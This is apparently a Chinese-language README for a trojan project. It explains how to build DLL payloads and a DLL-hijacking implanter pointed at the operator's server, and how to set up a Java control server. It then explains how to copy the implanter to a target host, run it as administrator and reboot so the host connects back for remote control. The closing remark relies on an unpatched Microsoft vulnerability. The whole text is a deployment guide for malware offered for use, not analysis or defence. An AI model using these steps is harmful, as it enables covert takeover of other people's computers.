
# 编译说明

## DLL编译

1. 使用Visual Studio新建动态链接库(DLL)项目
2. 修改DLL-generate.cpp中的服务器IP与端口部分为你的服务器IP以及ControlServer侦听的端口
3. 将DLL-generate.cpp中的内容复制到项目名.cpp中
4. 在Visual Studio项目的运行部分设置为Release x86,生成项目
5. 在项目文件夹的Release文件夹中找到生成的DLL文件，拷贝出来，并重命名为spcv32.dll
6. 重复步骤4，但配置改为Release x64
7. 在项目文件夹的x64/Release文件夹中找到生成的DLL文件，拷贝出并重命名为spcv64.dll

## 木马植入端编译

1. 使用Dev C++新建一个桌面应用程序项目
2. 修改DLL劫持.cpp中STEP1部分的服务器IP和端口设置为你的服务器的IP以及DllLoadServer侦听的端口
3. 将DLL劫持.cpp中的内容拷贝至桌面应用程序项目的.cpp文件中，编译项目

## 服务器编译

1. 使用Eclipse或IDEA新建java应用程序，将服务器代码文件夹中所有.java文件拷贝到工程目录内。
2. 在ServerMain类中的Main函数处修改DllLoadServer以及ControlServer要侦听的端口号，同时配置32位dll(spcv32.dll)以及64位dll(spcv64.dll)的文件路径

# 运行说明

1. 首先，在服务器上运行服务器java项目(ServerMain类为主类)
2. 将木马植入程序拷贝到目标主机，右键管理员权限运行，你应该能在控制服务器出观察到Dll装载的输出
3. 重启目标主机，等待目标主机连接到控制服务器

# 控制说明



# 备注

由于项目的特殊性，虽然不能保证在完全按照这些步骤执行后一定能成功运行,但我们能够肯定程序的功能完全正常(只要微软没有修复该漏洞XD)。如果在生成或运行过程中出现了什么问题，请[与我联系](mailto:boyu.charon@gmail.com)。